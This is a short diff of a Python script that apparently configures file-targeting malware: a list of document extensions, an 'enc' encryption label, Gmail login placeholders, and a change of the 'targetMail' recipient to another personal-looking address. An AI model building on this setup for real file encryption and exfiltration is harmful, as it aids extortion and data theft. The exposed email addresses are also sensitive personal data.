@@ -12,7 +12,7 @@ fileType = ['txt', 'doc', 'docx', 'xlsx', 'sxi', 'cpp', 'inp', 'out', 'img', 'jp
 encName = 'enc'
 gmailUsername = 'from@gmail.com'
 gmailPassword = 'password'
-targetMail = 'minhnghianguyen75@gmail.com'
+targetMail = 'votruongtrunghieu@gmail.com'
 
 def createident():
     st = str(datetime.datetime.now()).replace(' ', '.')
